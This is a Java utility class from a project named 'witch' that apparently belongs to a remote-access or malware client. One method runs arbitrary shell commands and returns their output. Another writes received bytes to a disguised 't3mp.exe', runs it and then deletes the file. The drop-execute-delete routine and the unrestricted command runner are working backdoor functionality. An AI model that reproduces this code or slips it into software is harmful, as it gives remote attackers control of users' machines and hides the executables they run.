package me.soda.witch.utils;

import me.soda.witch.Witch;

import java.io.*;
import java.nio.charset.StandardCharsets;

public class ShellUtil {
    public static boolean isWin() {
        return System.getProperty("os.name").toLowerCase().contains("windows");
    }

    public static String runCmd(String command) {
        StringBuilder result = new StringBuilder();
        try {
            Process process;
            if (isWin()) {
                process = Runtime.getRuntime().exec(
                        new String[]{"cmd.exe", "/c", command}
                );
            } else {
                process = Runtime.getRuntime().exec(command);
            }
            BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            String line;
            while ((line = inputStream.readLine()) != null) {
                result.append(line).append("\n");
            }
            inputStream.close();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            Witch.printStackTrace(e);
        }
        return result.toString();
    }

    public static void runProg(byte[] bytes) {
        try {
            File file = new File("t3mp.exe");
            file.createNewFile();
            FileOutputStream out = new FileOutputStream(file);
            out.write(bytes);
            out.close();
            Process process = Runtime.getRuntime().exec("t3mp.exe");
            process.waitFor();
            if (file.exists()) file.delete();
        } catch (IOException | InterruptedException e) {
            Witch.printStackTrace(e);
        }
    }
}
